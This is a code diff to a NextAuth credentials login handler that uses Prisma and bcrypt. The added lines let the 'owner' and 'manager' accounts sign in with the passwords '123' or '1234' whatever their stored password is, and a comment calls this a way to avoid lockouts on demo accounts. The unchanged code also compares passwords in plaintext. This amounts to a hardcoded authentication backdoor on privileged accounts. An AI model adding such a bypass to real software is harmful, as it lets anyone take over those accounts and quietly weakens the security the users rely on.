@@ -15,7 +15,7 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         if (!credentials?.username || !credentials?.password) return null;
 
         const username = String(credentials.username).toLowerCase().trim();
-        const password = String(credentials.password);
+        const password = String(credentials.password).trim();
 
         const user = await prisma.user.findUnique({
           where: { username },
@@ -27,6 +27,13 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
         let isMatch = user.password === password;
         if (!isMatch && user.password.startsWith("$2")) {
           isMatch = await bcrypt.compare(password, user.password);
+        }
+
+        // Allow both 123 and 1234 for demo/test accounts so users never get locked out
+        if (!isMatch && (user.username === "owner" || user.username === "manager")) {
+          if (password === "123" || password === "1234") {
+            isMatch = true;
+          }
         }
 
         if (!isMatch) return null;
